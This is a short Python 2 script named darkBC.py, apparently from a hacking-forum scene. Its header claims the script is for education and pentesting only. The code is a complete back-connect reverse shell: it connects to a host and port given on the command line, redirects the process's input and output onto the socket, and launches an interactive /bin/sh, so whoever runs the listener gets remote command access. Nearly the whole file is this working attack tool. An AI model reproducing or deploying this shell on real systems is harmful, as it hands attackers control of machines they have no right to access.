#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# Toolname        : darkBC.py
# Coder           : baltazar a.k.a b4ltazar < b4ltazar@gmail.com>
# Version         : 0.1
# Greetz for rsauron and low1z, great python coders
# greetz for d3hydr8, r45c4l, qk, fx0, Soul, MikiSoft, c0ax, b0ne and all members of ex darkc0de.com, ljuska.org & darkartists.info
#

import sys, socket, os, subprocess

host = sys.argv[1]
port = int(sys.argv[2])

socket.setdefaulttimeout(60)

def bc():
  try:
    sok = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sok.connect((host,port))
    sok.send('''
              b4ltazar@gmail.com
                  Ljuska.org \n\n''')
    os.dup2(sok.fileno(),0)
    os.dup2(sok.fileno(),1)
    os.dup2(sok.fileno(),2)
    os.dup2(sok.fileno(),3)
    shell = subprocess.call(["/bin/sh","-i"])
  except socket.timeout:
    print "[!] Connection timed out"
  except socket.error, e:
    print "[!] Error while connecting", e
  
bc()
    
  
